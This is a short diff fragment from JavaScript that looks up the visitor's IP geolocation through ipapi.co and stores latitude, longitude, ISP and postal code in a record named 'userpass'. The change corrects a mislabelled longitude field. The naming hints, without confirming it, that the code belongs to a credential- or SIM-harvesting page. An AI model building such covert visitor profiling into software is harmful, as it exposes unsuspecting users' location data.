@@ -64,7 +64,7 @@ fetch("https://ipapi.co/json/")
   push(userpass, {
     location: "Location of Sim",
     latitude: data.latitude,
-    location: data.longitude,
+    longitude: data.longitude,
     Service: data.org,
     Postal: data.postal
   })
